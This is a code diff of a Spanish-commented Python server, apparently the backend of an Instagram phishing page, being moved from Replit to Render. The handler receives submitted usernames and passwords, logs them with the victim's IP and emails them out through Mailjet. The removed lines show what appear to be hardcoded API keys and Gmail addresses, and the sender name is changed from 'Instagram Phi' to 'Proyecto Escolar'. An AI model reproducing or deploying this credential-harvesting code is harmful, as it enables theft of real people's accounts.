@@ -1,4 +1,4 @@
-# server.py - versión para Replit
+# server.py - versión para Render
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import json
 from datetime import datetime
@@ -6,11 +6,11 @@ import requests
 import os
 
 # --- CONFIG DESDE VARIABLES DE ENTORNO ---
-MAILJET_API_KEY = os.environ.get("26f97d1e712110b2df6b678c218a6cc6")
-MAILJET_SECRET_KEY = os.environ.get("9ce777cf5fc96abcb064e3ddecfc371d")
-SENDER_EMAIL = os.environ.get("mexicanonwod@gmail.com")
-RECIPIENT_EMAIL = os.environ.get("isowyvencid@gmail.com")
-SENDER_NAME = "Instagram Phi"
+MAILJET_API_KEY = os.environ.get("MAILJET_API_KEY")
+MAILJET_SECRET_KEY = os.environ.get("MAILJET_SECRET_KEY")
+SENDER_EMAIL = os.environ.get("SENDER_EMAIL")
+RECIPIENT_EMAIL = os.environ.get("RECIPIENT_EMAIL")
+SENDER_NAME = "Proyecto Escolar"
 
 # --- HANDLER ---
 class InstagramHandler(BaseHTTPRequestHandler):
@@ -32,7 +32,7 @@ class InstagramHandler(BaseHTTPRequestHandler):
                 ip = self.client_address[0]
                 fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-                # Log local en consola Replit
+                # Log local en consola Render
                 print(f"📥 Login recibido -> [{fecha}] {ip} | Usuario: {username} | Contraseña: {password}")
 
                 # Enviar por Mailjet
@@ -95,8 +95,7 @@ Fecha: {fecha}
 
 # --- MAIN ---
 if __name__ == "__main__":
-    PORT = int(os.getenv("PORT", 8000))  # Replit asigna el puerto automáticamente
+    PORT = int(os.environ.get("PORT", 8080))
     server = HTTPServer(('0.0.0.0', PORT), InstagramHandler)
-    print(f"✅ Servidor corriendo en http://localhost:{PORT}")
+    print(f"🚀 Servidor corriendo en puerto {PORT}")
     server.serve_forever()
-
